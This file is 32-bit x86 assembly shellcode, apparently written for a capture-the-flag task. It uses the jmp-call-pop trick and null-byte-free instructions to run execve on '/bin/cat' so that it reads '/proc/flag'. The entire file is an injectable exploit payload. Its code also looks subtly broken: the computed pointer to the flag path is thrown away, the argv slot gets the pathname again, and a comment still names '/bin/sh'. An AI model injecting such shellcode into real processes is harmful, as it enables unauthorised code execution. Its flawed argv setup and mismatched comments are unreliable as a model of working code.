#include <sys/syscall.h>

#define STRING  "/bin/catN/proc/flagN"
#define STRLEN0 8
#define STRLEN1 10
#define ARGV    (STRLEN0 + 1 + STRLEN1 + 1)
#define ARGV1   (ARGV+4)
#define ENVP    (ARGV+8)


.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  popl    %esi                    /* esi points to STRING */
  movl    %esi,(ARGV)(%esi)       /* set up argv pointer to pathname */
  xorl    %eax,%eax               /* get a 32-bit zero value */
  movb    %al,(STRLEN0)(%esi)      /* null-terminate our string */

  leal    9(%esi),%eax         
  movl    %esi,(ARGV1)(%esi)       /* set up argv pointer to pathname */
  xorl    %eax,%eax               /* get a 32-bit zero value */
  movb    %al,(STRLEN0 + 1 + STRLEN1)(%esi)      /* null-terminate our string */

  xorl    %eax,%eax               /* get a 32-bit zero value */
  movl    %eax,(ENVP)(%esi)       /* set up null envp */
  
  movb    $SYS_execve,%al         /* syscall number */
  movl    %esi,%ebx               /* arg 1: string pathname */
  leal    ARGV(%esi),%ecx         /* arg 2: argv */
  leal    ENVP(%esi),%edx         /* arg 3: envp */
  int     $0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], NULL) */
  
  xorl    %ebx,%ebx               /* arg 1: 0 */
  movl    %ebx,%eax
  inc     %eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int     $0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING
